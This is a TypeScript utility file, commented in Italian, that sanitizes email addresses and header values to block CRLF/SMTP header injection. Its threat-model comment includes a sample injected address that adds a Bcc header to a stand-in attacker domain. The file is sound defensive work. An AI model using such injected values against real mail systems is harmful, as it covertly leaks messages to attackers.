/**
 * Email sanitization utility — anti CRLF/header injection (RFC 5322).
 *
 * Threat model:
 *  - Attacker passa email con `\r\n` embedded → SMTP interpreta come header
 *    multiline → inietta BCC/Reply-To/Subject arbitrari.
 *  - Esempio attacco: `victim@x.com\r\nBcc: leak@evil.com`
 *
 * Difesa:
 *  - sanitizeEmailAddress: reject se contiene \r|\n|\0 OR formato non valido.
 *  - sanitizeEmailHeader: strip \r|\n da qualunque header value (subject etc).
 *
 * Stessa logic duplicata in apps/portal/src/lib/email-sanitize.ts perché
 * runtime e portal sono pacchetti separati (no shared deps cross-app).
 */

import { coerceString } from '@/lib/coerce.js';

// RFC 5322 simplified (production-grade, accetta i casi comuni inclusi
// quoted-local + IDN host. Reject domini con caratteri pericolosi).
const EMAIL_RE = /^[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;

// Caratteri di control che permettono header injection in SMTP
const FORBIDDEN_CHARS = /[\r\n\0]/;

export class EmailSanitizeError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'EmailSanitizeError';
  }
}

/**
 * Valida email address singolo. Reject se contiene CRLF/NULL o non match RFC.
 * Ritorna l'email trimmed se valido.
 * Throw EmailSanitizeError se invalido.
 */
export function sanitizeEmailAddress(input: unknown): string {
  if (typeof input !== 'string') {
    throw new EmailSanitizeError('email must be a string');
  }
  const trimmed = input.trim();
  if (trimmed.length === 0) {
    throw new EmailSanitizeError('email is empty');
  }
  if (trimmed.length > 320) {
    // RFC 5321 hard limit
    throw new EmailSanitizeError('email exceeds RFC 5321 limit (320 chars)');
  }
  if (FORBIDDEN_CHARS.test(trimmed)) {
    throw new EmailSanitizeError('email contains control chars (\\r/\\n/\\0) — header injection blocked');
  }
  if (!EMAIL_RE.test(trimmed)) {
    throw new EmailSanitizeError(`email format invalid: ${trimmed.slice(0, 100)}`);
  }
  return trimmed;
}

/**
 * Valida array di email (per to/cc/bcc). Accetta string singola, array, o
 * stringa CSV "a@b.com, c@d.com". Ritorna array sanitized.
 */
export function sanitizeEmailList(input: unknown): string[] {
  if (input == null) return [];
  let raw: string[];
  if (Array.isArray(input)) {
    raw = input.map((x) => String(x));
  } else if (typeof input === 'string') {
    raw = input.split(/[,;]/).map((s) => s.trim()).filter((s) => s.length > 0);
  } else {
    throw new EmailSanitizeError('email list must be string or array');
  }
  return raw.map(sanitizeEmailAddress);
}

/**
 * Sanitize header value (subject, reply-to display, etc): strip \r/\n/\0.
 * NON throw — semplicemente replace con spazio. Usato per campi liberi
 * dove l'utente può legittimamente inserire testo ma SMTP CRLF è pericoloso.
 */
export function sanitizeEmailHeader(input: unknown): string {
  if (input == null) return '';
  return coerceString(input).replace(/[\r\n\0]+/g, ' ').trim();
}

/**
 * Sanitize email address con display name (es. "Nicola <n@x.com>").
 * Format RFC 5322: `Display Name <local@domain>` o solo `local@domain`.
 * Display name: strip CRLF + escape doppi quote.
 */
export function sanitizeEmailWithDisplayName(input: unknown): string {
  if (typeof input !== 'string') {
    throw new EmailSanitizeError('email must be a string');
  }
  const trimmed = input.trim();
  // Pattern: "name <email@domain>" or "email@domain"
  const angleMatch = /^"?([^<>"]*?)"?\s*<([^>]+)>$/.exec(trimmed);
  if (angleMatch) {
    const displayName = sanitizeEmailHeader(angleMatch[1] ?? '').replace(/"/g, '\\"');
    const addr = sanitizeEmailAddress(angleMatch[2] ?? '');
    return displayName ? `"${displayName}" <${addr}>` : addr;
  }
  return sanitizeEmailAddress(trimmed);
}
